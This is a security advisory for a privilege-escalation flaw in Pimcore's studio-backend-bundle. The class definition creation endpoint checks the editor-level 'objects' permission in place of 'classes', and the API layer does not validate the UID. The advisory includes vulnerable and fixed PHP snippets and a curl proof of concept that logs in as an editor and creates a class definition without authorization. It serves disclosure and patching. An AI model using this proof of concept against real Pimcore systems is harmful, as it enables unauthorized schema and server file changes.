# [H] Pimcore: Insufficient Permission Check on Class Definition Creation Endpoint Allows Privilege Escalation

## Summary
Severity: High
Advisory: GHSA-f97c-ph8j-8vff
CVE: CVE-2026-55212
CWE: CWE-20, CWE-285
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N (CVSS_V3)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-f97c-ph8j-8vff
Type: github-advisory

## Affected
- Packagist: `pimcore/studio-backend-bundle` — affected >=0 <2026.1.6
- Packagist: `pimcore/studio-backend-bundle` — affected >=2026.1.0 <2026.1.6

## Details
### Summary
The Studio API class definition creation endpoint in `pimcore/studio-backend-bundle` is guarded by the `objects` permission instead of the `classes` permission, allowing any standard editor-level user to create class definitions without admin privileges. Class definition creation is a structural admin operation that generates new database tables and PHP class files on the server. Additionally, the API layer performs no format validation on the `uid` field before passing it to the model layer, relying solely on model-level validation that exists downstream in `ClassDefinition::saveClassInternal()`.

### Details

### Issue 1 — Incorrect permission guard on CreateController

`studio-backend-bundle/src/Class/Controller/DefinitionConfiguration/CreateController.php`:

```php
#[IsGranted(UserPermissions::DATA_OBJECTS->value)]
```

The endpoint `POST /pimcore-studio/api/class/definition/configuration-view/detail/create` is protected by `DATA_OBJECTS` (the `objects` permission), which is a standard editor-level permission granted to content editors for creating and editing data objects. Class definition creation is a structural admin operation equivalent to schema modification, it creates new database tables and generates PHP class files on the server. This operation should require the `classes` permission, which is the permission Pimcore enforces for class definition management in the Classic Admin.

Any authenticated user with object editing rights can call this endpoint and create new class definitions, bypassing the intended admin-only restriction. The same user cannot perform this action through the Classic Admin UI, confirming the Studio API enforces a weaker permission check than the existing interface.

**Correct guard:**
```php
#[IsGranted(UserPermissions::CLASSES->value)]
```

### Issue 2 — No UID format validation at the API layer

`studio-backend-bundle/src/Class/MappedParameter/CreateClassDefinitionParameters.php`:

```php
public function __construct(
    private string $name,
    private string $uid
) {
    if (trim($name) === '' || trim($uid) === '') {
        throw new InvalidArgumentException('Class name and UID cannot be empty.');
    }
}
```

Only an empty-string check is performed on `uid` at the API boundary before the value is passed to the model layer. While `ClassDefinition::saveClassInternal()` now validates the UID format via anchored regex, no equivalent validation exists in `CreateClassDefinitionParameters`. A malformed UID passes through the API layer without any format check and only fails deep in the model layer, returning an unformatted internal exception to the caller rather than a clean 400 API validation response, which can expose internal stack traces depending on server configuration.

Defense-in-depth requires validation at the API boundary consistent with the model layer. The same regex now applied in `ClassDefinition.php` should also be enforced here:

```php
if (!preg_match('/^[a-zA-Z0-9][a-zA-Z0-9_]*$/', trim($this->uid))) {
    throw new InvalidArgumentException(
        sprintf('Invalid UID for class definition: %s', $this->uid)
    );
}
```

**Affected files in `pimcore/studio-backend-bundle`:**
- `src/Class/Controller/DefinitionConfiguration/CreateController.php`
- `src/Class/MappedParameter/CreateClassDefinitionParameters.php`

**Vulnerable endpoint:**
`POST /pimcore-studio/api/class/definition/configuration-view/detail/create`

### PoC

**Prerequisites:**
- Pimcore 2026.1.x with Studio API enabled
- A user `editor` with only the `objects` permission and no `classes` permission

**Step 1 — Authenticate as the editor user:**

```bash
curl -s -c /tmp/cookies.txt -X POST \
  "https://your-pimcore/pimcore-studio/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"editor","password":"password"}'
```

Expected response:
```json
{"message": "Login successful"}
```

**Step 2 — Confirm the user has no class management access in Classic Admin**

Log into Classic Admin as `editor`. Verify the Classes menu is not visible and
the user cannot access Settings > Classes. This confirms the `classes` permission
is not granted to this user.

**Step 3 — Create a class definition via the Studio API despite lacking the classes permission:**

```bash
curl -s -b /tmp/cookies.txt -X POST \
  "https://your-pimcore/pimcore-studio/api/class/definition/configuration-view/detail/create" \
  -H "Content-Type: application/json" \
  -d '{"name":"UnauthorizedClass","uid":"testuid1"}'
```

Expected response (vulnerable):
```json
{"id": "testuid1", "name": "UnauthorizedClass", ...}
```

The class definition is created successfully by a user with no `classes` permission.
The Studio API accepts the request where the Classic Admin would deny it entirely.

Expected response (patched):
```json
{"status": 403, "detail": "Access denied."}
```

### Impact
Any authenticated Pimcore user with the standard `objects` permission can create class definitions via the Studio API, bypassing the `classes` permission restriction enforced in the Classic Admin. This is a privilege escalation from editor level to
a capability that should be restricted to administrators. Class definition creation generates new database tables and PHP class files on the server, giving an unprivileged user the ability to modify the application schema, introduce malformed class structures, and trigger downstream processing outside their permission scope.

The missing API-layer UID validation compounds this by allowing malformed UIDs to reach the model layer, producing unhandled internal exceptions that may expose stack traces depending on server debug configuration.

- **Authentication required from attacker:** Yes - valid Pimcore session with  `objects` permission required
- **Authentication required from victim:** No - no victim action needed
- **What is accessible:** Full class definition creation capability including database table generation and PHP class file creation on the server

## References
- https://github.com/pimcore/pimcore/security/advisories/GHSA-f97c-ph8j-8vff
- https://nvd.nist.gov/vuln/detail/CVE-2026-55212
- https://github.com/pimcore/studio-backend-bundle/pull/1886
- https://github.com/pimcore/studio-backend-bundle/commit/d1a4788c0f159c360d550c34256c8abbbd633ae0
- https://github.com/pimcore/pimcore
- https://github.com/pimcore/studio-backend-bundle/releases/tag/v2025.4.6
- https://github.com/pimcore/studio-backend-bundle/releases/tag/v2026.1.6
